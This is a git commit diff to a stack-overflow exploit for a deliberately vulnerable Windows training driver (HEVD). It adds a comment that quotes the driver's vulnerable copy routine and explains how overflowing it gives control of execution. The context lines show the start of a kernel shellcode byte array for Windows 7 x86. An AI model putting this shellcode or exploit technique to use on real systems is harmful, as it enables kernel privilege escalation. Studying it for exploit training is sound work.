602e5faec3f4571baa64eb7055ec1485b9f3a5da
Yn <30512781+akayn@users.noreply.github.com>
2017-09-12 21:32:55 -0700

    Update HEVD-StackOverFlowx86Win7.c

--- HEVD-Vanilla-Bug-Class's/HEVD-StackOverFlowx86Win7.c
+++ HEVD-Vanilla-Bug-Class's/HEVD-StackOverFlowx86Win7.c
@@ -3,6 +3,67 @@
 #include <string.h>
 #include <stdio.h>
 
+/*
+
+NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
+    NTSTATUS Status = STATUS_SUCCESS;
+    ULONG KernelBuffer[BUFFER_SIZE] = {0};
+ 
+    PAGED_CODE();
+ 
+    __try {
+        // Verify if the buffer resides in user mode
+        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));
+ 
+        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
+        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
+        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
+        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
+ 
+#ifdef SECURE
+        // Secure Note: This is secure because the developer is passing a size
+        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
+        // there will be no overflow
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
+#else
+        DbgPrint("[+] Triggering Stack Overflow\n");
+ 
+        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
+        // because the developer is passing the user supplied size directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of KernelBuffer
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
+#endif
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+ 
+    return Status;
+}
+
+'''
+Again, great work here on showing the vulnerability but
+also showing what the fix would be. RtlCopyMemory takes
+a pointer to the kernel buffer, a pointer to the input
+buffer and an integer to know how many bytes to copy over.
+Clearly there is an issue here, in the vulnerable version
+the buffer size is based in the input buffer size whereas 
+in the secure version the size is limited to the size of the kernel buffer.
+If we call this driver function and pass it a buffer which is larger
+than the kernel buffer we should get some kind of exploit primitive!
+'''
+B33F
+
+<-----------------
+To Put it simply The buffer gets allocated onto the stack, giving the attacker the opportunity,
+to overwrite the return instruction pointer (rip) & getting full control over the execution flow.
+---------------->
+
+
+*/
+
 unsigned char win7x86pl[] = {
 	0x60, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x50, 0x89, 0xC1,
 	0xBA, 0x04, 0x00, 0x00, 0x00, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x2D,
